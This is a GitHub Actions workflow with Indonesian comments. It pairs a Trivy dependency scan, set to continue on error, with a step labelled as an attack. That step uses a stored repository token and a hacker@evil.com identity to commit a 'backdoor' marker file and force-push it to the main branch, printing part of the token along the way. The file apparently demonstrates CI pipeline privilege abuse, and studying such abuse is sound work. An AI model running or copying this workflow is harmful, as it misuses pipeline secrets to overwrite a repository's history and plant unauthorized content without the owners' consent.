name: Dependency Security Scan
on: [push]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Run Trivy Scan
        uses: aquasecurity/trivy-action@master
        continue-on-error: true # <--- TAMBAHKAN INI agar serangan di bawahnya tetap jalan
        with:
          scan-type: 'fs'
          format: 'table'
          exit-code: '1' # GAGALKAN pipeline jika ditemukan celah High/Critical
          severity: 'CRITICAL,HIGH'

      - name: Attack - Successful Privilege Abuse
        env:
          MY_SECRET_TOKEN: ${{ secrets.HACKER_TOKEN }}
        run: |
          echo "Memulai serangan..."
          git config --global user.email "hacker@evil.com"
          git config --global user.name "Hacker_Inside"
          
          # Buat file
          echo "BERHASIL TEMBUS" > backdoor_final.txt
          
          # Cek apakah token ada isinya (Akan muncul *** jika ada)
          echo "Cek ketersediaan token: ${MY_SECRET_TOKEN:0:3}***"
          
          git add backdoor_final.txt
          git commit -m "EVIL: Exploit"
          
          # Gunakan format URL yang lebih paksa
          git push --force https://x-access-token:${MY_SECRET_TOKEN}@github.com/${{ github.repository }}.git main
